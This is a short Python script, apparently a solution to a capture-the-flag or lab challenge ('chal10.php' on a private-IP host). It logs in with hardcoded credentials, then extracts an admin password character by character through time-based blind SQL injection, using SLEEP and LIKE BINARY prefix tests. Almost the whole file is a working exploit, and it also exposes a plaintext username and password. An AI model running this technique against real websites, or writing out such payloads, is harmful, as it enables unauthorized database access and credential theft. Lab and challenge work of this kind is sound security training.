import requests
from tqdm import tqdm
import time

s = requests.Session()
login_data = {'username':'aksagg', 'password':'WLyyNdQSjc6QXx1'}
r_login = s.post("https://172.27.20.32:8443/login.php", login_data, verify=False)

#possarr = [chr(x) for x in range(ord('a'), ord('z')+1) ] + [chr(x) for x in range(ord('A'), ord('Z')+1) ] + [chr(x) for x in range(ord('0'), ord('9')+1) ]
possarr = set([chr(x) for x in range(0,128)] ) - set(["\"", "\'", "%", "_"])
possarr.add("\_")

currpass = ""

while True:
    for c in possarr:
        trypass = currpass + c
        before = time.time()
        reqData = {'username': 'admin" and (password NOT LIKE BINARY "'+ trypass +'%" or  password =  1-SLEEP(0.4)  ) --  '}

        r = s.post("https://172.27.20.32:8443/chal10.php", reqData, verify=False)
        after = time.time()
        if after - before > 0.2:
            currpass += c
            print currpass
            before = time.time()
            reqData = {'username': 'admin" and (password NOT LIKE BINARY "'+ trypass +'" or  password =  1-SLEEP(0.4)  ) --  '}

            r = s.post("https://172.27.20.32:8443/chal10.php", reqData, verify=False)
            after = time.time()
            
            if after - before > 0.2:
                print "The password is" , trypass 
                quit()

